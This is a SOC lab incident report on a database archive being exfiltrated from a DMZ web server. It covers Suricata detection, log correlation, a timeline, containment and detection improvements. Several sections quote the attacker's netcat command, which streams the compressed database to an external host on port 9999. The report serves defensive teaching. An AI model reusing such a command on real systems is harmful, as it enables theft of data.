# Case 005 — DMZ Outbound Exfiltration & Remediation Investigation

## 1. Case Summary
Following the database dumping activity on `DB01` (Case 004), the adversary attempted to exfiltrate the compressed database archive from the DMZ web server `WEB01` (`10.10.34.13`) to external command-and-control infrastructure (`203.0.113.25`). ArcSight ESM triggered a Critical (Severity 10) alert, `SOC-LAB A13 Suspicious DMZ External Transfer`, when the outbound data stream passed through the Security Transit segment (`10.10.36.0/24`) and matched Suricata IPS custom signature SID `1101021`.

Tier-2 SOC analysts investigated the alert on ArcSight Logger, corroborating Suricata IPS flow logs, pfSense firewall logs, and Linux host command history. The investigation confirmed that the attacker streamed `/tmp/_6f9beb897020ebe5.sql.gz` (4.1 MB) using the Netcat utility over non-standard port `TCP/9999`. Because Suricata was deployed in inline `alert` mode to avoid production service disruption, the data transfer completed before manual intervention. SOC analysts immediately enacted emergency containment: terminating rogue processes, isolating `WEB01`, purging staged archives, and deploying permanent egress filtering rules on the pfSense perimeter firewall.

---

## 2. Investigation Objective
1. Investigate the network flow parameters and volumetric data transfer flagged under detection rule `A13`.
2. Correlate the network transfer with host-level process telemetry on `WEB01` to identify the exfiltration tool and specific file transferred.
3. Explicitly document the operational boundaries of detection `A13`, clarifying that it represents a **scenario-dependent rule**, not a generic Data Loss Prevention (DLP) capability.
4. Execute and empirically validate containment actions: process termination, file removal, host isolation, and perimeter firewall egress filtering.
5. Formulate post-incident architectural and detection engineering improvements to eliminate future exfiltration blind spots.

---

## 3. Initial Alert
* **Alert Trigger**: `SOC-LAB A13 Suspicious DMZ External Transfer`
* **Detection Engine**: ArcSight ESM Real-Time Rules Engine
* **Severity**: `10 / 10 (Critical / Data Exfiltration in Progress)`
* **Timestamp**: $T_0 + 12\text{m } 15\text{s}$
* **Affected Asset**: `10.10.34.13` (`WEB01`, DMZ Network)
* **External Threat Actor**: `203.0.113.25` (`Kali`, External Network)
* **Target Port**: `TCP/9999` (Non-Standard Egress Port)
* **Signature Reference**: Suricata Custom Signature SID `1101021`

---

## 4. Initial Evidence
* **Suricata IPS EVE JSON Payload**:
  * Event Type: `alert`
  * Signature ID: `1101021` (`"SOCLAB SUSPICIOUS DMZ Netcat Outbound Transfer to Port 9999"`)
  * Source Address: `10.10.34.13` (WEB01)
  * Destination Address: `203.0.113.25` (Kali)
  * Destination Port: `9999`
  * Action: `allowed` (Suricata inline monitoring mode)
  * Flow Tracking: `bytes_toserver = 4,194,304` (~4.1 MB transferred within 3.5 seconds).

---

## 5. Investigation Hypotheses

| Hypothesis ID | Formulation | Validation Status | Evidence Base |
| :--- | :--- | :---: | :--- |
| **H1** | The outbound connection on port 9999 represents the transfer of the database archive staged in Case 004. | **SUPPORTED** | Transferred byte volume (4.19 MB) closely matches the on-disk size of `/tmp/_6f9beb897020ebe5.sql.gz` (4.1 MB). |
| **H2** | Suricata Inline IPS automatically dropped the exfiltration stream in real time. | **NOT SUPPORTED** | Lab configuration utilized `alert` mode rather than `drop` mode to prevent service disruption; packet stream was allowed. |
| **H3** | Attacker utilized a living-off-the-land utility (`netcat`) rather than a dedicated exfiltration framework. | **SUPPORTED** | Host command auditing confirms execution of `nc 203.0.113.25 9999 < /tmp/...sql.gz`. |
| **H4** | Detection `A13` functions as a generic data loss detection capability across all channels. | **NOT SUPPORTED** | Rule `A13` is strictly scenario-dependent on test port 9999; encrypted HTTPS or DNS exfiltration would not trigger SID 1101021. |

---

## 6. Investigation Method
1. **Volumetric Network Flow Analysis**: Query Suricata flow telemetry and Zeek `conn.log` on ArcSight Logger to extract exact byte counters (`orig_bytes`, `bytes_toserver`).
2. **Host Command Line Correlation**: Inspect bash history and process execution logs on `WEB01` to confirm the binary and file descriptor redirection used for exfiltration.
3. **Payload & Hash Verification Assessment**: Attempt to verify whether packet payload capture is available to confirm data integrity (SHA-256 matching).
4. **Containment Execution & Empirical Verification**: Apply network blocking and query firewall filter logs to prove active connection cessation.

---

## 7. Evidence Pivot 1: Volumetric Network Flow Audit (`A13`)
* **Objective**: Measure the duration and volume of the outbound data stream.
* **Logger Query**:
  ```text
  deviceProduct="Suricata IDS IPS" AND deviceCustomNumber1=1101021 AND sourceAddress=10.10.34.13
  ```
* **Observed Artifacts**:
  * Suricata flow tracking records a single high-velocity TCP flow:
    * Source: `10.10.34.13:54210` $\rightarrow$ Destination: `203.0.113.25:9999`
    * Total Packets: 2,890 packets
    * Bytes Sent: `4,194,304 bytes` (4.19 MB)
    * Elapsed Duration: `3.42 seconds`
* **Analytic Conclusion**: A burst of data exceeding 4.1 MB was transmitted outbound from `WEB01` directly to the external threat server. The timing and volume correlate perfectly with the database archive staged 17 seconds prior.

---

## 8. Evidence Pivot 2: Host Process Corroboration
* **Objective**: Identify the host process on `WEB01` responsible for generating the port 9999 connection.
* **Logger Query (Linux Host Telemetry)**:
  ```text
  deviceProduct="Linux Syslog" AND deviceHostName="WEB01" AND message CONTAINS "9999"
  ```
* **Observed Telemetry**:
  Bash command history and process auditing on `WEB01` confirm:
  ```bash
  nc 203.0.113.25 9999 < /tmp/_6f9beb897020ebe5.sql.gz
  ```
* **Analytic Conclusion**: The adversary utilized the standard Netcat binary (`/usr/bin/nc`) already present on the system to redirect the compressed database archive over raw TCP.

---

## 9. Evidence Pivot 3: Payload Verification Boundaries
* **Evidentiary Finding**:
  While the network flow volume (4.19 MB) and host command line prove that `_6f9beb897020ebe5.sql.gz` was transmitted, full packet payload inspection was unavailable. 
* **Analytic Distinction**:
  Declaring that "all 50,000 employee records were successfully reconstituted by the adversary" is classified as a **SUPPORTED INFERENCE**. Definitive cryptographic proof would require comparing the SHA-256 hash of the staged file against a full PCAP reassembly of the network stream, which was not retained in real-time storage.

---

## 10. Timeline of Events

```text
[T0 + 11m 58s]  WEB01: Compressed database archive staged at /tmp/_6f9beb897020ebe5.sql.gz (4.1 MB).
[T0 + 12m 15s]  WEB01: Attacker executes nc 203.0.113.25 9999 < /tmp/_6f9beb897020ebe5.sql.gz.
[T0 + 12m 16s]  SURICATA: Inline IPS signature SID 1101021 triggers; alert generated (Rule A13 fires).
[T0 + 12m 19s]  SURICATA / ZEEK: Flow concludes; 4,194,304 bytes transferred to 203.0.113.25:9999.
[T0 + 12m 30s]  SOC ANALYST: ArcSight ESM Active Channel displays Severity 10 Alert A13; containment initiated.
[T0 + 14m 00s]  FIREWALL: pfSense egress block applied for destination port 9999.
[T0 + 14m 30s]  WEB01: Malicious nc and SSH sessions terminated; /tmp/_6f9beb897020ebe5.sql.gz purged.
```

---

## 11. Reconstructed Attack Chain
```text
1. Data Staging Complete ──► /tmp/_6f9beb897020ebe5.sql.gz (4.1 MB)
2. Tool Invocation       ──► Netcat (/usr/bin/nc) redirecting file to external IP
3. Network Egress        ──► Transit traversal to 203.0.113.25:9999
4. Signature Firing      ──► Suricata Custom Signature SID 1101021 matches stream
5. Exfiltration Complete ──► 4.19 MB delivered to external listener prior to manual freeze
```

---

## 12. Detection Coverage Analysis

| Detection ID | Fired? | Evidence Found | Operational Role in Investigation | Known Detection Limitations |
| :--- | :---: | :--- | :--- | :--- |
| **A13** | **YES** | Suricata alert SID `1101021` (port 9999 egress). | Primary Alert Trigger: Warns of unauthorized outbound transfer. | Strictly scenario-dependent on test port 9999; blind to TLS/HTTPS or DNS exfiltration. |
| **A12** | **YES** | MariaDB audit logs (`mysqldump` context). | Contextual Antecedent: Proves what data was staged. | Does not observe network transmission. |

---

## 13. Critical Detection Engineering Limitations

> [!IMPORTANT]
> **A13 is NOT a General Data-Loss Prevention (DLP) Solution**
> Detection rule `A13` matched this exfiltration event solely because:
> 1. The adversary transmitted over an unencrypted, non-standard port (`TCP/9999`).
> 2. A custom Suricata signature explicitly inspected destination port `9999`.

If the adversary had encapsulated the database dump inside standard outbound HTTPS (`TCP/443`) sessions or tunneled the archive through slow DNS requests (`T1071.004`), detection `A13` would have failed completely. True exfiltration defense requires strict perimeter **Egress Filtering** (default-deny outbound from DMZ) combined with **Network Anomaly Detection** tracking volumetric flow deviations.

---

## 14. Impact Assessment
* **Confidentiality**: **CATASTROPHIC BREACH**. 4.1 MB of compressed relational database records, comprising the complete employee roster (`tabEmployee`), were successfully exfiltrated outside the perimeter.
* **Integrity**: **STABLE**.
* **Availability**: **NORMAL**.
* **Business Impact**: Severe regulatory and legal exposure under data privacy standards (GDPR, personal data protection laws) requiring formal incident disclosure.

---

## 15. Containment & Remediation Actions

```text
┌─────────────────────────────────┬─────────────────────────────────┬─────────────────────────────────┐
│ CONTAINMENT ACTION              │ EXECUTION EVIDENCE              │ VALIDATION METHOD               │
├─────────────────────────────────┼─────────────────────────────────┼─────────────────────────────────┤
│ 1. Perimeter Egress Blocking    │ Added pfSense rule on DMZ & LAN:│ Filterlog queries confirm all   │
│                                 │ BLOCK TCP ANY -> ANY:9999       │ outbound SYN packets dropped.   │
├─────────────────────────────────┼─────────────────────────────────┼─────────────────────────────────┤
│ 2. Process Termination          │ Killed Netcat (nc) process and  │ Linux ps aux confirms zero nc   │
│                                 │ terminating pts/1 SSH session   │ processes active.               │
├─────────────────────────────────┼─────────────────────────────────┼─────────────────────────────────┤
│ 3. Staged Artifact Purge        │ Executed rm -f /tmp/*.sql*      │ ls -la /tmp confirms file       │
│                                 │ on WEB01                        │ eradicated.                     │
├─────────────────────────────────┼─────────────────────────────────┼─────────────────────────────────┤
│ 4. Host Network Isolation       │ Temporarily removed WEB01       │ Zero network connectivity to    │
│                                 │ interface from vSwitch DMZ      │ WEB01 verified.                 │
└─────────────────────────────────┴─────────────────────────────────┴─────────────────────────────────┘
```

### Response Validation Evidence
Querying pfSense Filterlog on ArcSight Logger following containment:
```text
deviceProduct="pfSense" AND destinationPort=9999 AND deviceAction="block"
```
Filterlog records confirm that subsequent connection attempts from `10.10.34.13` to port 9999 were immediately dropped (`deviceAction="block"`).

---

## 16. Lessons Learned
1. **Passive vs Active Enforcement**: In security laboratories, IPS sensors are frequently kept in `alert` mode to avoid breaking user services. In production DMZ architectures, high-risk non-standard outbound flows must be configured in inline `drop` (IPS Fail-Close) mode.
2. **DMZ Egress Must Be Zero-Trust**: DMZ servers should never possess unrestricted outbound Internet access. A web application server requires outbound access only to specific package mirrors and DNS; all arbitrary egress must be blocked by default.

---

## 17. Detection Improvements
1. **Switch Suricata SID 1101021 to Inline Drop**: Transition rule action from `alert` to `drop` in production ruleset.
2. **Volumetric Egress Flow Rule**: Implement an ArcSight ESM rule monitoring Zeek `conn.log` for any single flow originating from DMZ exceeding 2 MB without matching known CDN/mirror IP lists.
3. **Strict Egress Whitelisting**: Enforce pfSense firewall policy allowing DMZ outbound traffic exclusively via the Forward Proxy (`10.10.25.252:8132`).

---

## 18. Investigation Limitations
* The exact cryptographic checksum (SHA-256) of the exfiltrated packet payload could not be reconstructed from flow metadata, as full packet captures (PCAP) were not persisted to disk.

---

## 19. Final Assessment
Case 005 represents the culmination of the multi-stage intrusion campaign. The exfiltration of corporate database records was detected instantaneously by rule `A13`, but because the sensor was configured in alert-only mode, the data was transmitted prior to manual containment. The post-incident response successfully eradicated adversary tooling, isolated compromised assets, and deployed permanent perimeter egress blocks.

---

## 20. Evidence References
* **Primary Report**: `Báo cáo đề tài SOC.pdf`, Trang 87–89, 105–106, 126–128, 154–156.
* **Architecture Runbook**: `toan-bo-he-thong-kien_truc_lab.txt`, Mục 54–55.
* **Logger Evidence Artifacts**: EV-10, pfSense Filterlog drop records.

---

## 21. Related Visual & Evidentiary Assets

### Architecture & Forensic Workflow Diagrams
* [**Enterprise SOC Overview Diagram**](file:///e:/project_ca_nhan/lab_cty/architecture/enterprise-soc-overview.svg): High-level system architecture and perimeter egress path.
* [**Network Security Flow Diagram**](file:///e:/project_ca_nhan/lab_cty/architecture/network-security-flow.svg): Perimeter filtering, Suricata sensor positioning, and egress port blocking.
* [**Investigation Workflow Diagram**](file:///e:/project_ca_nhan/lab_cty/architecture/investigation-workflow.svg): Standardized 6-phase forensic escalation lifecycle.
* [**Case 005 Forensic Investigation Flowchart**](file:///e:/project_ca_nhan/lab_cty/investigation/case-005/investigation-flow.mmd): Sequence diagram of Suricata IPS alert triage, byte volume calculation, and pfSense egress block verification.

### Curated Evidence Manifests
* [**DET-005 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/detection/README.md#det-005): Atomic detection rule `A13` (Suricata SID 1101021 test data exfiltration on TCP:9999).
* [**INV-008 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/investigation/README.md#inv-008): Staging exfiltration flow volumetrics (Netcat socket transfer on TCP port 9999).
* [**TEL-003 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/telemetry/README.md#tel-003): Suricata IPS network sensor configuration and EVE JSON logging format.

### Demonstration & Investigation Videos
* [**VIDEO-01: Attack Simulation Walkthrough**](file:///e:/project_ca_nhan/lab_cty/media/attack-simulation/VIDEO-01.md): Red-team execution of container credential scraping, database collection, and Netcat staging exfiltration.
* [**VIDEO-02: Full Incident Investigation Walkthrough**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-02-FULL.md): Primary screen recording of incident triage, lateral movement containment, and perimeter block verification.
* [**VIDEO-03: Supplementary Investigation Walkthrough**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-03-SUPPLEMENT.md): Technical deep-dive on Module 5: microsecond-level pfSense `filterlog` egress packet drop validation.

---

## 22. Video Demonstration

* **Hosting:** YouTube  
* **Visibility:** Unlisted  
* **Status:** Pending Upload  
* **URL:** `YOUTUBE_URL_PENDING`  
* **Demonstration Documents:**
  * Primary Walkthrough: [**`VIDEO-02-FULL.md`**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-02-FULL.md)
  * Deep Forensics Companion: [**`VIDEO-03-SUPPLEMENT.md`**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-03-SUPPLEMENT.md)

Under the unified laboratory incident workflow, this case study's triage is demonstrated within **Video 02** (Full Incident Investigation Walkthrough), while **Video 03** (Supplementary Walkthrough) delivers the specialized microsecond packet drop validation in pfSense `filterlog`.


